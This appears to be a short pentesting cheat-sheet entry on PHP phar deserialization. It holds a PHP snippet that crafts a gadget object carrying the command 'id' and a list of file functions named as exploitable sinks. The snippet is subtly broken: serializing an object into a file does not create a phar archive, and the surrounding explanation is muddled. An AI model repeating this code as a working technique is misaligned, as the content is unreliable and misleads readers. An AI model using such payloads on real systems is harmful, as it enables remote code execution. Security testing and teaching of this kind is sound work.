PHP
===


## Deserialization

### Phar deserialization
The unserialization of a `phar` wrapper is realized in any file operation. Thus,
file operation such as `file_exists` might be less protected, then it's possible
to inject a `phar` wrapper within it.

The following code describes how to create a `phar` wrapper:

```php
<?php

require('weak_class.php');
# We craft an object by overwriting some methods and functions
$obj = new WeakClass();
$obj->args = "id";

# Then, we serialize the object to a file
file_put_contents("/tmp/exploit.phar", serialize($obj));
```

Here is an example of exploitable functions:

```
copy
file_exists
file_get_contents
file_put_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
fopen
is_dir
is_executable
is_file
is_link
is_readable
is_writable
lstat
mkdir
parse_ini_file
readfile
rename
rmdir
stat
touch
unlink
```
